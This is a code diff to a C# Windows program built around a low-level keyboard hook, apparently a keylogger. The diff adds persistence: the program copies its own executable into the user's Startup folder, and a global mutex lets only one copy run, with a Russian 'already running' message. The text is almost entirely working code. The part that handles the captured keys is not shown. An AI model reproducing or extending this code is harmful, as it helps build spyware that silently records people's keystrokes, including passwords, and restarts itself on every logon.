@@ -4,6 +4,8 @@ using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Globalization;
+using System.IO;
+using System.Reflection;
 
 class InterceptKeys
 {
@@ -12,11 +14,36 @@ class InterceptKeys
     private static LowLevelKeyboardProc _proc = HookCallback;
     private static IntPtr _hookID = IntPtr.Zero;
 
+    private static string destinationFIlePath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Process.GetCurrentProcess().ProcessName + ".exe";
+
+    private static string thisLocation = Assembly.GetEntryAssembly().Location;
+    private static string thisDirectory = Path.GetDirectoryName(thisLocation);
+    private static string thisProcessname = Process.GetCurrentProcess().ProcessName;
+    private static string thisFile = Path.Combine(thisDirectory, thisProcessname + ".exe");
+
+    private static string appGuid = Assembly.GetExecutingAssembly().GetType().GUID.ToString();
+
+    private static void copyToStartUp()
+    {
+        File.Copy(thisFile, destinationFIlePath);
+    }
+
     public static void Main()
     {
-        _hookID = SetHook(_proc);
-        Application.Run();
-        UnhookWindowsHookEx(_hookID);
+        using (Mutex mutex = new Mutex(false, "Global\\" + appGuid)) {
+            if (!mutex.WaitOne(0, false)) {
+                MessageBox.Show("Программа уже работает!");
+                return;
+            }
+
+            if (!(new FileInfo(destinationFIlePath).Exists))
+                copyToStartUp();
+
+            _hookID = SetHook(_proc);
+            Application.Run();
+
+            UnhookWindowsHookEx(_hookID);
+        }
     }
 
     private static IntPtr SetHook(LowLevelKeyboardProc proc)
